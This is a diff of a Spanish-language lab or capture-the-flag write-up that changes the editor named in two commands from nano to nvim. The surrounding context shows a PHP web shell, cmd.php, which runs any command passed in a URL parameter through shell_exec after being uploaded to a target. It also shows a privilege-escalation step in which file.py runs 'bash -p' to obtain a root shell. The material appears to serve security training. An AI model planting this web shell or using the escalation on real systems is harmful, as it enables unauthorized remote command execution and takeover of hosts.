@@ -42,7 +42,7 @@ Miramos la captura del proxy y encontramos que además de la passwd podemos ver 
 Observamos que se pueden subir archivos, nos creamos un 'php' para poderlo subir. 
 
 ```php
-❯ nano cmd.php
+❯ nvim cmd.php
 
 	<?php 
 		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
@@ -169,7 +169,7 @@ Comandos para la escalada:
 ```python
 # Modificamos el archivo 'file.py'
 
-❯ nano file.py         # Para hacer que el le de privilegios a la bash y asi convertirnos en root
+❯ nvim file.py         # Para hacer que el le de privilegios a la bash y asi convertirnos en root
 	
 	import os 
 	os.system("bash -p")        
